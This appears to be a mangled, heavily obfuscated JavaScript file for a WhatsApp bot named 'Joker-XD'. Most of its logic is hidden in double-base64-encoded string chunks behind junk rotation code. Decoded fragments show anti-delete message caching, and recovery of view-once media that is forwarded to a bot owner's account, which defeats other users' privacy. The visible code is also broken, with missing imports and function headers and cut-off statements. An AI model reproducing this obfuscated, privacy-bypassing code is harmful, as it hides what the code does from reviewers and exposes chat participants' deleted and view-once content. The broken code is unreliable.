c5dVpTQTlJR3BwWkU1MWJXSmxjaWhoYkhRcElIeDhJR3BwWkU1MWJXSmxjaWh5WVhjcE93b2dJQ0FnYVdZZ0tIQm9iMjVsTG14bGJtZDBhQ0E4SURjZ2ZId2djR2h2Ym1VdWJHVnVaM1JvSUQ0Z01UVXBJSEJvYjI1bElEMGc=","T3lBdkx5QnNiMjVuSUdScFoybDBjeUE5SUhWdWNtVnpiMngyWldRZ1RFbEVMQ0JrYjI0bmRDQnphRzkzSUdsMElHRnpJR0VnYm5WdFltVnlDaUFnSUNCamIyNXpkQ0J1WVcxbElEMGdVM1J5YVc1bktIWnRjMmMvTG5CMWMyaE9ZVzFsSUh4OElBPT0=","T3dvZ0lIMGdZMkYwWTJnZ2V5QnlaWFIxY200Zw==","T3lCOUNuMEtJQ0IwY25rZ2V3b2dJQ0FnYVdZZ0tDRnRjMmMvTG0xbGMzTmhaMlVnZkh3Z2JYTm5MbXRsZVQ4dVpuSnZiVTFsS1NCeVpYUjFjbTQ3Q2lBZ0lDQnBaaUFvYlhObkxtdGxlVDh1Y21WdGIzUmxTbWxrSUQwOVBTQT0=","S1RzS0lDQWdJSDBnWTJGMFkyZ2dLR1VwSUhzS0lDQWdJQ0FnWTI5dWMyOXNaUzUzWVhKdUtBPT0=","TENCbExtMWxjM05oWjJVZ2ZId2daU2s3Q2lBZ0lDQWdJQzh2SUdaaGJHeGlZV05yQ2lBZ0lDQWdJSFJ5ZVNCN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnYjNCMGN5QTlJSHNnYkc5bloyVnlPaUJ3YVc1dktIc2diR1YyWld3NklBPT0=","SUgwcExDQnlaWFZ3Ykc5aFpGSmxjWFZsYzNRNklITnZZMnN1ZFhCa1lYUmxUV1ZrYVdGTlpYTnpZV2RsSUgwN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnZG04Z1BTQjFibmR5WVhCTlpYTnpZV2RsS0cxelp5NXRaWE56WVdkbElIeDhJSHQ5S1RzS0lDQWdJQ0FnSUNCaWRXWm1aWElnUFNCaGQyRnBkQ0JrYjNkdWJHOWhaRTFsWkdsaFRXVnpjMkZuWlNoN0lHdGxlVG9nYlhObkxtdGxlU3dnYldWemMyRm5aVG9nZG04Z2ZTd2c=","TENCN2ZTd2diM0IwY3lrN0NpQWdJQ0FnSUgwZ1kyRjBZMmdnS0dVeUtTQjdDaUFnSUNBZ0lDQWdZMjl1YzI5c1pTNWxjbkp2Y2lnPQ==","TENCbE1pNXRaWE56WVdkbElIeDhJR1V5S1RzS0lDQWdJQ0FnSUNCeVpYUjFjbTQ3Q2lBZ0lDQWdJSDBLSUNBZ0lIMEtJQ0FnSUdsbUlDZ2hZblZtWm1WeUlIeDhJQ0ZpZFdabVpYSXViR1Z1WjNSb0tTQjdDaUFnSUNBZ0lHTnZibk52YkdVdWJHOW5LQT09","S1RzS0lDQWdJQ0FnY21WMGRYSnVPd29nSUNBZ2ZRb0tJQ0FnSUM4dklGQmxjbk5wYzNRZ2RHOGdkR1Z0Y0NCbWIzSWdjbVZqYjNabGNua0tJQ0FnSUdOdmJuTjBJSFJ0Y0VScGNpQTlJSEJoZEdndWFtOXBiaWh3Y205alpYTnpMbU4zWkNncExDQT0=","S1NCamIyNTBaVzUwSUQwZ2V5QnBiV0ZuWlRvZ1luVm1abVZ5TENCallYQjBhVzl1T2lCallYQjBhVzl1SUh4OElBPT0=","SUgwN0NpQWdJQ0JsYkhObElHbG1JQ2gwZVhCbElEMDlQU0E9","S1NCamIyNTBaVzUwSUQwZ2V5QjJhV1JsYnpvZ1luVm1abVZ5TENCallYQjBhVzl1T2lCallYQjBhVzl1SUh4OElBPT0=","S1NCN0NpQWdJQ0FnSUdOdmJuUmxiblFnUFNCN0NpQWdJQ0FnSUNBZ1lYVmthVzg2SUdKMVptWmxjaXdLSUNBZ0lDQWdJQ0J0YVcxbGRIbHdaVG9nYldWa2FXRlBZbW91YldsdFpYUjVjR1VnZkh3Zw==","TEFvZ0lDQWdJQ0FnSUhCMGREb2dJU0Z0WldScFlVOWlhaTV3ZEhRS0lDQWdJQ0FnZlRzS0lDQWdJSDBLQ2lBZ0lDQXZMeUJEWVdOb1pTQmhiSGRoZVhNZ0tHWnZjaUJ5WldGamRHbHZiaUJ2Y0dWdUlDc2dZVzUwYVMxa1pXeGxkR1VwQ2lBZ0lDQnRaWE56WVdkbFEyRmphR1V1YzJWMEtHMWpTMlY1S0hOdlkyc3NJRzF6WjBsa0tTd2dld29nSUNBZ0lDQnRjMmNzQ2lBZ0lDQWdJSFJwYldWemRHRnRjRG9nUkdGMFpTNXViM2NvS1N3S0lDQWdJQ0FnYVhOV2FXVjNUMjVqWlRvZ2RISjFaU3dLSUNBZ0lDQWdjSEpsWW5WcGJIUTZJR052Ym5SbGJuUXNDaUFnSUNBZ0lHMWxaR2xoVUdGMGFDd0tJQ0FnSUNBZ2JXVmthV0ZVZVhCbE9pQjBlWEJsQ2lBZ0lDQjlLVHNLSUNBZ0lHbG1JQ2h0WlhOellXZGxRMkZqYUdVdWMybDZaU0ErSURFd01EQXBJSHNLSUNBZ0lDQWdZMjl1YzNRZ1ptbHljM1FnUFNCdFpYTnpZV2RsUTJGamFHVXVhMlY1Y3lncExtNWxlSFFvS1M1MllXeDFaVHNLSUNBZ0lDQWdhV1lnS0dacGNuTjBLU0J0WlhOellXZGxRMkZqYUdVdVpHVnNaWFJsS0dacGNuTjBLVHNLSUNBZ0lIMEtDaUFnSUNBdkx5QkRiMjVtYVdjNklIWnBaWGR2Ym1ObExtcHpiMjRnZXlCbGJtRmliR1ZrTENCdGIyUmxPaUE9","SUgwS0lDQWdJR052Ym5OMElIWnZRMlpuSUQwZ2NtVmhaRXB6YjI0b2MyWW9jMjlqYXl3Zw==","S1N3Z2V5QmxibUZpYkdWa09pQm1ZV3h6WlN3Z2JXOWtaVG9n","SUQ4Z2FtbGtJRG9nY0hKcGRtRmplVTkzYm1WeVNtbGtLSE52WTJzcE93b2dJQ0FnYVdZZ0tDRmtaWE4wS1NCN0NpQWdJQ0FnSUdOdmJuTnZiR1V1ZDJGeWJpZz0=","S1RzS0lDQWdJQ0FnY21WMGRYSnVPd29nSUNBZ2ZRb0tJQ0FnSUM4dklFUmxiR0Y1SURYaWdKTTNJSE5sWTI5dVpITWdZbVZtYjNKbElHUnBjM0JzWVhscGJtY2djbVZqYjNabGNtVmtJSFpwWlhjdGIyNWpaU0FvWVc1NUlHMXZaR1VwQ2lBZ0lDQmhkMkZwZENCa1pXeGhlU2cxTURBd0lDc2dUV0YwYUM1bWJHOXZjaWhOWVhSb0xuSmhibVJ2YlNncElDb2dNakF3TVNrcE93b0tJQ0FnSUdOdmJuTjBJSE5sYm1SbGNsSmhkeUE5SUcxelp5NXJaWGt1Y0dGeWRHbGphWEJoYm5RZ2ZId2diWE5uTG10bGVTNXlaVzF2ZEdWS2FXUTdDaUFnSUNCamIyNXpkQ0J6Wlc1a1pYSk9kVzBnUFNCcWFXUk9kVzFpWlhJb2MyVnVaR1Z5VW1GM0tTQjhmQ0E9","T3dvZ0lDQWdZMjl1YzNRZ2FYTkhjbTkxY0NBOUlGTjBjbWx1WnlocWFXUWdmSHdn","S1RzS0lDQWdJR3hsZENCbmNtOTFjRTVoYldVZ1BTQT0=","T3dvZ0lDQWdhV1lnS0dselIzSnZkWEFwSUhzS0lDQWdJQ0FnZEhKNUlIc0tJQ0FnSUNBZ0lDQmpiMjV6ZENCdFpYUmhJRDBnWVhkaGFYUWdjMjlqYXk1bmNtOTFjRTFsZEdGa1lYUmhLR3BwWkNrN0NpQWdJQ0FnSUNBZ1ozSnZkWEJPWVcxbElEMGdiV1YwWVQ4dWMzVmlhbVZqZENCOGZDQnFhV1E3Q2lBZ0lDQWdJSDBnWTJGMFkyZ2dld29nSUNBZ0lDQWdJR2R5YjNWd1RtRnRaU0E5SUdwcFpEc0tJQ0FnSUNBZ2ZRb2dJQ0FnZlFvS0lDQWdJQzh2SUZObGJtUWdiV1ZrYVdFZ1ptbHljM1FnS0d0bFpYQWdkR2hsSUhObGJuUWdiV1Z6YzJGblpTQnpieUIwYUdVZ2FXNW1ieUJqWVc0Z1ltVWdZU0J5WlhCc2VTQjBieUJwZENrS0lDQWdJR052Ym5OMElITmxiblJOWldScFlTQTlJR0YzWVdsMElITnZZMnN1YzJWdVpFMWxjM05oWjJVb1pHVnpkQ3dnWTI5dWRHVnVkQ2t1WTJGMFkyZ29LR1VwSUQwK0lIc0tJQ0FnSUNBZ1kyOXVjMjlzWlM1bGNuSnZjaWc9","TENCbExtMWxjM05oWjJVZ2ZId2daU2s3Q2lBZ0lDQWdJSEpsZEhWeWJpQnVkV3hzT3dvZ0lDQWdmU2s3Q2dvZ0lDQWdMeThnU1c1bWJ5QnRaWE56WVdkbElPS0FsQ0J5WlhCc2FXVnpJSFJ2SUhSb1pTQm1iM0ozWVhKa1pXUWdiV1ZrYVdFc0lHTnZiR3hoY0hObFpDQmlaV2hwYm1RZw==","Q2lBZ0lDQmpiMjV6ZENCMGFXMWxVM1J5SUQwZ2JtVjNJRVJoZEdVb0tTNTBiMHh2WTJGc1pWTjBjbWx1WnlnPQ==","TENCN0lIUnBiV1ZhYjI1bE9pQT0=","SUgwcE93b2dJQ0FnWTI5dWMzUWdabkp2YlV4aFltVnNJRDBnYVhOSGNtOTFjQ0EvSUdkeWIzVndUbUZ0WlNBNklBPT0=","S1M1cGJtTnNkV1JsY3lnPQ==","S1NBbUppQWhVM1J5YVc1bktHVnljajh1YldWemMyRm5aU0I4ZkNBPQ==","S1NrZ2V3b2dJQ0FnSUNCamIyNXpiMnhsTG1WeWNtOXlLQT09","TENCbGNuSXViV1Z6YzJGblpTQjhmQ0JsY25JcE93b2dJQ0FnZlFvZ0lIMEtmUW9LQ2k4cUtpQlRhRzl5ZENBdklHVnRiMnBwSUdGc2FXRnpaWE1nWm05eUlIWjJNaURpZ0pRZ2IyNXNlU0IzYUdWdUlISmxjR3g1SUdseklHOXVJSFpwWlhjdGIyNWpaU0FxTHdvZ0lBPT0=","Q2wwcE93b0tDaThxS2lCU1pYTnZiSFpsSUd4dlkyRnNJRzFsYm5VZ2FXMWhaMlVnY0dGMGFDQW9TbTlyWlhJdFdFUWdjM1I1YkdVcExpQlFjbVZtWlhJZ1kzVnpkRzl0TENCMGFHVnVJR1JsWm1GMWJIUWdZWE56WlhSekxpQXFMd29nSUM4dklGQmxjaTF6WlhOemFXOXVJR04xYzNSdmJTQnBiV0ZuWlNCbWFYSnpkQ0FvYzJWemMybHZibk12UEc1MWJXSmxjajR2WkdGMFlTOXRaVzUxYVcxaFoyVXVhbkJuS1N3Z2RHaGxiaUIwYUdVZ2MyaGhjbVZrSUdSbFptRjFiSFF1Q2lBZ1kyOXVjM1FnYjNkdUlEMGdjMjlqYXlBL0lITm1LSE52WTJzc0lBPT0=","S1NBNklBPT0=","T3dvZ0lHbG1JQ2h2ZDI0Z0ppWWdabk11WlhocGMzUnpVM2x1WXlodmQyNHBJQ1ltSUdaekxuTjBZWFJUZVc1aktHOTNiaWt1YzJsNlpTQStJREFwSUhKbGRIVnliaUJ2ZDI0N0NpQWdZMjl1YzNRZ1pHVm1JRDBnY0dGMGFDNXFiMmx1S0hCeWIyTmxjM011WTNka0tDa3NJQT09","S1RzS0lDQmpiMjV6ZENCa1pXWlFibWNnUFNCd1lYUm9MbXB2YVc0b2NISnZZMlZ6Y3k1amQyUW9LU3dn","S1RzS0lDQnBaaUFvWm5NdVpYaHBjM1J6VTNsdVl5aGtaV1lwSUNZbUlHWnpMbk4wWVhSVGVXNWpLR1JsWmlrdWMybDZaU0ErSURBcElISmxkSFZ5YmlCa1pXWTdDaUFnYVdZZ0tHWnpMbVY0YVhOMGMxTjVibU1vWkdWbVVHNW5LU0FtSmlCbWN5NXpkR0YwVTNsdVl5aGtaV1pRYm1jcExuTnBlbVVnUGlBd0tTQnlaWFIxY200Z1pHVm1VRzVuT3dvZ0lISmxkSFZ5YmlCdWRXeHNPd3A5Q2dvdktpb2dVMlZ1WkNCdFpXNTFJR3hwYTJVZ1NtOXJaWEl0V0VRNklHeHZZMkZzSUdsdFlXZGxJR0oxWm1abGNpQXJJR05oY0hScGIyNDdJSFJsZUhRZ1ptRnNiR0poWTJzZ0tpOEtJQ0JqYjI1emRDQjBaWGgwSUQwZ2JXVnVkVlJsZUhRb2JYTm5MQ0J6YjJOcktUc0tJQ0JqYjI1emRDQnBiV2RRWVhSb0lEMGdaMlYwVFdWdWRVbHRZV2RsVUdGMGFDaHpiMk5yS1RzS0lDQnBaaUFvYVcxblVHRjBhQ2tnZXdvZ0lDQWdkSEo1SUhzS0lDQWdJQ0FnWTI5dWMzUWdZblZtSUQwZ1puTXVjbVZoWkVacGJHVlRlVzVqS0dsdFoxQmhkR2dwT3dvZ0lDQWdJQ0JoZDJGcGRDQnpiMk5yTG5ObGJtUk5aWE56WVdkbEtHMXpaeTVyWlhrdWNtVnRiM1JsU21sa0xDQjdJR2x0WVdkbE9pQmlkV1lzSUdOaGNIUnBiMjQ2SUhSbGVIUWdmU3dnZXlCeGRXOTBaV1E2SUcxelp5QjlLVHNLSUNBZ0lDQWdjbVYwZFhKdU93b2dJQ0FnZlNCallYUmphQ0FvWlNrZ2V3b2dJQ0FnSUNCamIyNXpiMnhsTG1WeWNtOXlLQT09","TENCbExtMWxjM05oWjJVZ2ZId2daU2s3Q2lBZ0lDQjlDaUFnZlFvZ0lDOHZJRTl3ZEdsdmJtRnNPaUIwY25rZ2MzUnZjbVZrSUVOaGRHSnZlQ0JWVWt3Z2IyNWpaU0JwWmlCc2IyTmhiQ0J0YVhOemFXNW5DaUFnZEhKNUlIc0tJQ0FnSUdOdmJuTjBJR2x0WVdkbFZYSnNJRDBnY21WaFpFcHpiMjRvYzJZb2MyOWpheXdn","S1N3Z2V5QjFjbXc2SUE9PQ==","SUgwcExuVnliRHNLSUNBZ0lHbG1JQ2hwYldGblpWVnliQ0FtSmlBdlhtaDBkSEJ6UHpwY0wxd3ZMMmt1ZEdWemRDaHBiV0ZuWlZWeWJDa3BJSHNLSUNBZ0lDQWdZMjl1YzNRZ1luVm1JRDBnWVhkaGFYUWdaRzkzYm14dllXUlZjbXhDZFdabVpYSW9hVzFoWjJWVmNtd3NJREV5TURBd0tUc0tJQ0FnSUNBZ1lYZGhhWFFnYzI5amF5NXpaVzVrVFdWemMyRm5aU2h0YzJjdWEyVjVMbkpsYlc5MFpVcHBaQ3dnZXlCcGJXRm5aVG9nWW5WbUxDQmpZWEIwYVc5dU9pQjBaWGgwSUgwc0lIc2djWFZ2ZEdWa09pQnRjMmNnZlNrN0NpQWdJQ0FnSUhKbGRIVnlianNLSUNBZ0lIMEtJQ0I5SUdOaGRHTm9JQ2hsS1NCN0NpQWdJQ0JqYjI1emIyeGxMbVZ5Y205eUtBPT0=","TENCbExtMWxjM05oWjJVZ2ZId2daU2s3Q2lBZ2ZRb2dJR0YzWVdsMElITmxibVFvZEdWNGRDazdDbjBLSUNBdkx5QlNiMkoxYzNRZ1VGQWdabVYwWTJnNklIUnllU0JuYVhabGJpQnFhV1FzSUhSb1pXNGdVRTRnWm05eWJTd2dkR2hsYmlCTVNVUWdkbWxoSUc5dVYyaGhkSE5CY0hBS0lDQmpiMjV6ZENCallXNWthV1JoZEdWeklEMGdXMTA3Q2lBZ1kyOXVjM1FnY21GM0lEMGdVM1J5YVc1bktHcHBaQ0I4ZkNBPQ==","S1M1allYUmphQ2dvS1NBOVBpQnVkV3hzS1RzS0lDQWdJQ0FnYVdZZ0tIVnliQ2tnZXdvZ0lDQWdJQ0FnSUdOdmJuTjBJR0oxWmlBOUlHRjNZV2wwSUdSdmQyNXNiMkZrVlhKc1FuVm1abVZ5S0hWeWJDd2dNVFV3TURBcE93b2dJQ0FnSUNBZ0lHbG1JQ2hpZFdZZ0ppWWdZblZtTG14bGJtZDBhQ2tnY21WMGRYSnVJR0oxWmpzS0lDQWdJQ0FnZlFvZ0lDQWdmU0JqWVhSamFDQjdmUW9nSUgwS0lDQnBaaUFvYm5WdEtTQjdDaUFnSUNCMGNua2dld29nSUNBZ0lDQmpiMjV6ZENCeVpYTWdQU0JoZDJGcGRDQnpiMk5yTG05dVYyaGhkSE5CY0hBb2JuVnRLUzVqWVhSamFDZ29LU0E5UGlCYlhTazdDaUFnSUNBZ0lHTnZibk4wSUdWdWRISjVJRDBnUVhKeVlYa3VhWE5CY25KaGVTaHlaWE1wSUQ4Z2NtVnpXekJkSURvZ2JuVnNiRHNLSUNBZ0lDQWdZMjl1YzNRZ2NtVnpiMngyWldRZ1BTQmxiblJ5ZVQ4dWFtbGtJSHg4SUdWdWRISjVQeTVzYVdRN0NpQWdJQ0FnSUdsbUlDaHlaWE52YkhabFpDQW1KaUFoYzJWbGJpNW9ZWE1vY21WemIyeDJaV1FwS1NCN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnZFhKc0lEMGdZWGRoYVhRZ2MyOWpheTV3Y205bWFXeGxVR2xqZEhWeVpWVnliQ2h5WlhOdmJIWmxaQ3dn","S1M1allYUmphQ2dvS1NBOVBpQnVkV3hzS1RzS0lDQWdJQ0FnSUNCcFppQW9kWEpzS1NCN0NpQWdJQ0FnSUNBZ0lDQmpiMjV6ZENCaWRXWWdQU0JoZDJGcGRDQmtiM2R1Ykc5aFpGVnliRUoxWm1abGNpaDFjbXdzSURFMU1EQXdLVHNLSUNBZ0lDQWdJQ0FnSUdsbUlDaGlkV1lnSmlZZ1luVm1MbXhsYm1kMGFDa2djbVYwZFhKdUlHSjFaanNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJSDBLSUNBZ0lIMGdZMkYwWTJnZ2UzMEtJQ0I5Q2lBZ2NtVjBkWEp1SUc1MWJHdzdDbjBLQ2k4dklEMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlJRU5QVFUxQlRrUlRJRDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5Q2lBZ1kyOXVjM1FnYW1sa0lEMGdiWE5uTG10bGVTNXlaVzF2ZEdWS2FXUTdDaUFnYVdZZ0tDRnBjMGR5YjNWd0tHcHBaQ2twSUhzS0lDQWdJR0YzWVdsMElITmxibVFv","S1RzS0lDQWdJSEpsZEhWeWJpQnVkV3hzT3dvZ0lIMEtJQ0JqYjI1emRDQnRaWFJoSUQwZ1lYZGhhWFFnYzI5amF5NW5jbTkxY0UxbGRHRmtZWFJoS0dwcFpDazdDaUFnWTI5dWMzUWdjMlZ1WkdWeUlEMGdiWE5uTG10bGVTNXdZWEowYVdOcGNHRnVkQ0I4ZkNCdGMyY3VhMlY1TG5KbGJXOTBaVXBwWkRzS0lDQnBaaUFvSVdselFXUnRhVzRvYldWMFlTd2djMlZ1WkdWeUtTQW1KaUFoYVhOUGQyNWxjaWh6YjJOckxDQnRjMmNwS1NCN0NpQWdJQ0JoZDJGcGRDQnpaVzVrS0E9PQ==","S1RzS0lDQWdJSEpsZEhWeWJpQnVkV3hzT3dvZ0lIMEtJQ0J5WlhSMWNtNGdiV1YwWVRzS2ZRb0tMeW9xSUZCbGNpMXpaWE56YVc5dUlIQnlaV1pwZUNBb1pXRmphQ0J3WVdseVpXUWdZbTkwSUd0bFpYQnpJR2wwY3lCdmQyNGdjSEpsWm1sNElHOXVJR1JwYzJzNklITmxjM05wYjI1ekwzdHVkVzE5TDJSaGRHRXZjSEpsWm1sNExtcHpiMjRwSUNvdkNpQWdZMjl1YzNRZ2JuVnRJRDBnWW05MFRuVnRZbVZ5Um5KdmJWTnZZMnNvYzI5amF5a2dmSHdn","T3dvZ0lHbG1JQ2hmY0hKbFptbDRRMkZqYUdVdWFHRnpLRzUxYlNrcElISmxkSFZ5YmlCZmNISmxabWw0UTJGamFHVXVaMlYwS0c1MWJTazdDaUFnYkdWMElIQWdQU0J3Y205alpYTnpMbVZ1ZGk1UVVrVkdTVmdnZkh3Zw==","T3dvZ0lIUnllU0I3Q2lBZ0lDQmpiMjV6ZENCaklEMGdjbVZoWkVwemIyNG9jMllvYzI5amF5d2c=","S1N3Z2JuVnNiQ2s3Q2lBZ0lDQnBaaUFvWXlBbUppQjBlWEJsYjJZZ1l5NXdjbVZtYVhnZ1BUMDlJQT09","S1NCd0lEMGdZeTV3Y21WbWFYZzdDaUFnZlNCallYUmphQ0I3ZlFvZ0lGOXdjbVZtYVhoRFlXTm9aUzV6WlhRb2JuVnRMQ0J3S1RzS0lDQnlaWFIxY200Z2NEc0tmUW9nSUdOdmJuTjBJRzUxYlNBOUlHSnZkRTUxYldKbGNrWnliMjFUYjJOcktITnZZMnNwSUh4OElBPT0=","T3dvZ0lIZHlhWFJsU25OdmJpaHpaaWh6YjJOckxDQT0=","S1N3Z2V5QndjbVZtYVhnNklIQWdmU2s3Q2lBZ1gzQnlaV1pwZUVOaFkyaGxMbk5sZENodWRXMHNJSEFwT3dwOUNpOHFLaUJUWlhOemFXOXVMWE5qYjNCbFpDQnJaWGtnWm05eUlHbHVMVzFsYlc5eWVTQmpZV05vWlhNZ0tITnZJSFIzYnlCaWIzUnpJR2x1SUhSb1pTQnpZVzFsSUdOb1lYUWdibVYyWlhJZ2MyaGhjbVVnWlc1MGNtbGxjeWtnS2k4S0NpOHFLaUJCWTNScGRtVWdhbTlyWlhJZ2FtOWljeUIwYUdGMElHTmhiaUJpWlNCallXNWpaV3hzWldRZ2QybDBhQ0F1YzNSdmNDQnFjM3hxZEh4cVlTQXFMd29LSUNCMGNua2dld29nSUNBZ2NtVjBkWEp1SUhOdlkycy9MblZ6WlhJL0xtbGtQeTV6Y0d4cGRDZz0=","S1Zzd1hTQjhmQ0J6YjJOclB5NWhkWFJvVTNSaGRHVS9MbU55WldSelB5NXRaVDh1YVdRL0xuTndiR2wwS0E9PQ==","S1Zzd1hTQjhmQ0E9","T3dvZ0lIMGdZMkYwWTJnZ2V3b2dJQ0FnY21WMGRYSnVJQT09","SUh4OElIUjVjR1Z2WmlCemIyTnJMbWR5YjNWd1VtVnhkV1Z6ZEZCaGNuUnBZMmx3WVc1MGMxVndaR0YwWlNBaFBUMGc=","S1NCN0NpQWdJQ0IwYUhKdmR5QnVaWGNnUlhKeWIzSW8=","S1RzS0lDQjlDZ29nSUdOdmJuTjBJRzFsZEdFZ1BTQmhkMkZwZENCemIyTnJMbWR5YjNWd1RXVjBZV1JoZEdFb2FtbGtLVHNLSUNCamIyNXpkQ0JqZFhKeVpXNTBUV1Z0WW1WeWN5QTlJRUZ5Y21GNUxtbHpRWEp5WVhrb2JXVjBZVDh1Y0dGeWRHbGphWEJoYm5SektTQS9JRzFsZEdFdWNHRnlkR2xqYVhCaGJuUnpMbXhsYm1kMGFDQTZJREE3Q2lBZ1kyOXVjM1FnYVc1cGRHbGhiRkJsYm1ScGJtY2dQU0JoZDJGcGRDQnpiMk5yTG1keWIzVndVbVZ4ZFdWemRGQmhjblJwWTJsd1lXNTBjMHhwYzNRb2FtbGtLVHNLSUNCamIyNXpkQ0J3Wlc1a2FXNW5RbVZtYjNKbElEMGdRWEp5WVhrdWFYTkJjbkpoZVNocGJtbDBhV0ZzVUdWdVpHbHVaeWtnUHlCcGJtbDBhV0ZzVUdWdVpHbHVaeTVzWlc1bmRHZ2dPaUF3T3dvZ0lHTnZibk4wSUhKbGJXRnBibWx1WjFOc2IzUnpJRDBnVFdGMGFDNXRZWGdvTUN3Z1FWQlFVazlXUlY5SFVrOVZVRjlNU1UxSlZDQXRJR04xY25KbGJuUk5aVzFpWlhKektUc0tDaUFnYVdZZ0tISmxjWFZsYzNSbFpFRnRiM1Z1ZENBaFBUMGdiblZzYkNBbUppQW9JVTUxYldKbGNpNXBjMGx1ZEdWblpYSW9jbVZ4ZFdWemRHVmtRVzF2ZFc1MEtTQjhmQ0J5WlhGMVpYTjBaV1JCYlc5MWJuUWdQQ0F4S1NrZ2V3b2dJQ0FnZEdoeWIzY2dibVYzSUVWeWNtOXlLQT09","S1RzS0lDQjlDZ29nSUd4bGRDQmhjSEJ5YjNabFpDQTlJREE3Q2lBZ1kyOXVjM1FnZEdGeVoyVjBJRDBnY21WeGRXVnpkR1ZrUVcxdmRXNTBJRDA5UFNCdWRXeHNJRDhnU1c1bWFXNXBkSGtnT2lCeVpYRjFaWE4wWldSQmJXOTFiblE3Q2dvZ0lDOHZJRkpsWm5KbGMyZ2dkR2hsSUhCbGJtUnBibWNnYkdsemRDQmhablJsY2lCbGRtVnllU0JpWVhSamFDQnpieUF1WVhCd2NtOTJaU0JoYkd3Z1kyOXVkR2x1ZFdWekNpQWdMeThnWVhCd2NtOTJhVzVuSUc1bGQyeDVMWFpwYzJsaWJHVWdjbVZ4ZFdWemRITWdkVzUwYVd3Z2RHaGxJR2R5YjNWd0lISmxZV05vWlhNZ2RHaGxJR052Ym1acFozVnlaV1FnWTJWcGJHbHVaeTRLSUNCM2FHbHNaU0FvWVhCd2NtOTJaV1FnUENCMFlYSm5aWFFwSUhzS0lDQWdJR052Ym5OMElHeGhkR1Z6ZENBOUlHRjNZV2wwSUhOdlkyc3VaM0p2ZFhCU1pYRjFaWE4wVUdGeWRHbGphWEJoYm5SelRHbHpkQ2hxYVdRcE93b2dJQ0FnWTI5dWMzUWdjR1Z1WkdsdVp5QTlJRUZ5Y21GNUxtbHpRWEp5WVhrb2JHRjBaWE4wS1NBL0lHeGhkR1Z6ZENBNklGdGRPd29nSUNBZ2FXWWdLQ0Z3Wlc1a2FXNW5MbXhsYm1kMGFDa2dZbkpsWVdzN0Nnb2dJQ0FnWTI5dWMzUWdjMnh2ZEhOTVpXWjBJRDBnVFdGMGFDNXRZWGdvTUN3Z1FWQlFVazlXUlY5SFVrOVZVRjlNU1UxSlZDQXRJQ2hqZFhKeVpXNTBUV1Z0WW1WeWN5QXJJR0Z3Y0hKdmRtVmtLU2s3Q2lBZ0lDQnBaaUFvYzJ4dmRITk1aV1owSUR3OUlEQXBJR0p5WldGck93b0tJQ0FnSUdOdmJuTjBJSFJoYTJVZ1BTQk5ZWFJvTG0xcGJpZzFNQ3dnY0dWdVpHbHVaeTVzWlc1bmRHZ3NJSE5zYjNSelRHVm1kQ3dnZEdGeVoyVjBJQzBnWVhCd2NtOTJaV1FwT3dvZ0lDQWdZMjl1YzNRZ1ltRjBZMmdnUFNCd1pXNWthVzVuTG5Oc2FXTmxLREFzSUhSaGEyVXBMbTFoY0NoNElEMCtJSGd1YW1sa0lIeDhJSGd1YVdRcExtWnBiSFJsY2loQ2IyOXNaV0Z1S1RzS0lDQWdJR2xtSUNnaFltRjBZMmd1YkdWdVozUm9LU0JpY21WaGF6c0tDaUFnSUNCamIyNXpkQ0J5WlhOMWJIUWdQU0JoZDJGcGRDQnpiMk5yTG1keWIzVndVbVZ4ZFdWemRGQmhjblJwWTJsd1lXNTBjMVZ3WkdGMFpTaHFhV1FzSUdKaGRHTm9MQ0E9","S1RzS0lDQWdJR052Ym5OMElITjFZMk5sYzNNZ1BTQkJjbkpoZVM1cGMwRnljbUY1S0hKbGMzVnNkQ2tLSUNBZ0lDQWdQeUJ5WlhOMWJIUXVabWxzZEdWeUtISWdQVDRnVTNSeWFXNW5LSEkvTG5OMFlYUjFjeUI4ZkNBPQ==","S1NBOVBUMGc="];
const _0x750c7afa=function(_0x){try{return Buffer.from(Buffer.from(_0x,"base64").toString(),"base64").toString("utf8")}catch(e){return ""}};


var _0x6aa5c348=function(){return _0x6aa5c348;};var _0xb9093f09=[_0x6aa5c348];
(function(_0xa,_0xb){var _0xc=function(_0xd){while(--_0xd){_0xa.push(_0xa.shift())};};_0xc(++_0xb)})(_0xb9093f09,0x1a3);

// Joker-XD core helpers — shared by pairing, events and every plugin.
// (moved out of routes/pairing.js; code unchanged)
  useMultiFileAuthState,
  delay,
  makeCacheableSignalKeyStore,
  Browsers,
  DisconnectReason,
  fetchLatestWaWebVersion,
  downloadMediaMessage,
  downloadContentFromMessage,
  generateWAMessageFromContent,
  proto
} from _0x750c7afa(_0x3c7d8f2f[0]);




/** Resolve ffmpeg: system paths first (libwebp/libx264), then bundled installer */
  const candidates = [_0x750c7afa(_0x3c7d8f2f[1]), _0x750c7afa(_0x3c7d8f2f[2]), _0x750c7afa(_0x3c7d8f2f[3])];
  for (const c of candidates) {
    try { if (fs.existsSync(c)) return c; } catch {}
  }
  try {
    if (ffmpegInstaller?.path && fs.existsSync(ffmpegInstaller.path)) {
      return ffmpegInstaller.path;
    }
  } catch {}
  return _0x750c7afa(_0x3c7d8f2f[4]);
})();
console.log(_0x750c7afa(_0x3c7d8f2f[5]), FFMPEG_PATH);
/** Per-user sessions: sessions/{phone}/auth + sessions/{phone}/data */
fs.mkdirSync(TEMP_DIR, { recursive: true });
fs.mkdirSync(DATA_DIR, { recursive: true });
fs.mkdirSync(MEDIA_DIR, { recursive: true });
fs.mkdirSync(SESSIONS_DIR, { recursive: true });

/** Active multi-tenant sessions: phoneNumber -> { sock, number, authDir, dataDir, startedAt } */
/** Max concurrent sessions (2GB RAM server → ~5 safe). Override: MAX_SESSIONS env */

  if (!sock) return "";
  if (sock.__botNumber) return String(sock.__botNumber).replace(/\D/g, "");
  return jidNumber(sock.user?.id || sock.user?.lid || "");
}

  const num = typeof sockOrNum === _0x750c7afa(_0x3c7d8f2f[6])
    ? String(sockOrNum).replace(/\D/g, "")
    : botNumberFromSock(sockOrNum);
  const key = num || _0x750c7afa(_0x3c7d8f2f[7]);
  if (!num) console.warn(_0x750c7afa(_0x3c7d8f2f[8]));
  const dir = path.join(SESSIONS_DIR, key, _0x750c7afa(_0x3c7d8f2f[9]));
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

  const num = String(number || "").replace(/\D/g, "") || _0x750c7afa(_0x3c7d8f2f[7]);
